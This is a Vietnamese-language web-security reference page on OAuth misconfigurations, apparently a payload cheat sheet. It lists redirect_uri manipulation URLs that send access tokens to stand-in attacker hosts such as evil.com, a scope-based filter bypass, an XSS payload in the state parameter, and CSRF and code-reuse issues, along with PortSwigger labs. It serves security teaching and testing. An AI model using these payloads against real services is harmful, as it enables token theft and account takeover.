# OAuth Misconfiguration

> OAuth là một framework ủy quyền được sử dụng rộng rãi, cho phép các ứng dụng bên thứ ba truy cập dữ liệu của người dùng mà không cần tiết lộ thông tin xác thực của người dùng. Tuy nhiên, việc cấu hình và triển khai OAuth không đúng cách có thể dẫn đến các lỗ hổng bảo mật nghiêm trọng. Tài liệu này trình bày các lỗi cấu hình OAuth phổ biến, các hướng tấn công tiềm năng và các phương pháp tốt nhất để giảm thiểu những rủi ro này.

## Tóm tắt

* [Đánh cắp OAuth Token thông qua referer](#stealing-oauth-token-via-referer)
* [Lấy OAuth Token thông qua redirect_uri](#grabbing-oauth-token-via-redirect_uri)
* [Thực thi XSS thông qua redirect_uri](#executing-xss-via-redirect_uri)
* [Lộ Private Key của OAuth](#oauth-private-key-disclosure)
* [Vi phạm quy tắc Authorization Code](#authorization-code-rule-violation)
* [Cross-Site Request Forgery](#cross-site-request-forgery)
* [Các bài lab](#labs)
* [Tài liệu tham khảo](#references)

## Đánh cắp OAuth Token thông qua referer

> Bạn có HTML injection nhưng không thể thực hiện XSS? Trang web có triển khai OAuth không? Nếu có, hãy thiết lập một thẻ img trỏ đến máy chủ của bạn và xem liệu có cách nào đưa nạn nhân đến đó (redirect, v.v.) sau khi đăng nhập để đánh cắp OAuth token thông qua referer - [@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544)

## Lấy OAuth Token thông qua redirect_uri

Chuyển hướng đến một domain do kẻ tấn công kiểm soát để lấy access token.

```powershell
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

Chuyển hướng đến một Open URL được chấp nhận để lấy access token.

```powershell
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

Các triển khai OAuth không nên whitelist toàn bộ domain, mà chỉ nên whitelist một số URL cụ thể để `redirect_uri` không thể bị trỏ đến một Open Redirect.

Đôi khi cần thay đổi scope thành một giá trị không hợp lệ để bypass bộ lọc trên `redirect_uri`:

```powershell
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```

## Thực thi XSS thông qua redirect_uri

```powershell
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

## Lộ Private Key của OAuth

Một số ứng dụng Android/iOS có thể được decompile và OAuth Private Key có thể bị truy xuất.

## Vi phạm quy tắc Authorization Code

> Client **MUST NOT** sử dụng authorization code nhiều hơn một lần.

Nếu một authorization code được sử dụng nhiều hơn một lần, authorization server **MUST** từ chối request và **SHOULD** thu hồi (khi có thể) tất cả token đã được cấp trước đó dựa trên authorization code đó.

## Cross-Site Request Forgery

Các ứng dụng không kiểm tra CSRF token hợp lệ trong OAuth callback sẽ dễ bị tấn công. Điều này có thể bị khai thác bằng cách khởi tạo OAuth flow và chặn callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). URL này có thể được sử dụng trong các cuộc tấn công CSRF.

> Client **MUST** triển khai cơ chế bảo vệ CSRF cho redirection URI. Cách thực hiện phổ biến là yêu cầu mọi request được gửi đến endpoint redirection URI phải chứa một giá trị liên kết request đó với trạng thái đã xác thực của user-agent. Client **SHOULD** sử dụng tham số `state` để truyền giá trị này đến authorization server khi thực hiện authorization request.

## Các bài lab

* [PortSwigger - Authentication bypass via OAuth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
* [PortSwigger - Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
* [PortSwigger - OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
* [PortSwigger - Stealing OAuth access tokens via a proxy page](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
* [PortSwigger - Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

## Tài liệu tham khảo

* [All your Paypal OAuth tokens belong to me - asanso - November 28, 2016](https://web.archive.org/web/20161130191804/http://blog.intothesymmetry.com:80/2016/11/all-your-paypal-tokens-belong-to-me.html)
* [OAuth 2 - How I have hacked Facebook again (..and would have stolen a valid access token) - asanso - April 8, 2014](https://web.archive.org/web/20140411210456/http://intothesymmetry.blogspot.ch:80/2014/04/oauth-2-how-i-have-hacked-facebook.html)
* [How I hacked Github again - Egor Homakov - February 7, 2014](https://web.archive.org/web/20140302195803/http://homakov.blogspot.ch:80/2014/02/how-i-hacked-github-again.html)
* [How Microsoft is giving your data to Facebook… and everyone else - Andris Atteka - September 16, 2014](https://web.archive.org/web/20151221013410/http://andrisatteka.blogspot.ch:80/2014/09/how-microsoft-is-giving-your-data-to.html)
* [Bypassing Google Authentication on Periscope's Administration Panel - Jack Whitton - July 20, 2015](https://web.archive.org/web/20250113205505/https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/)
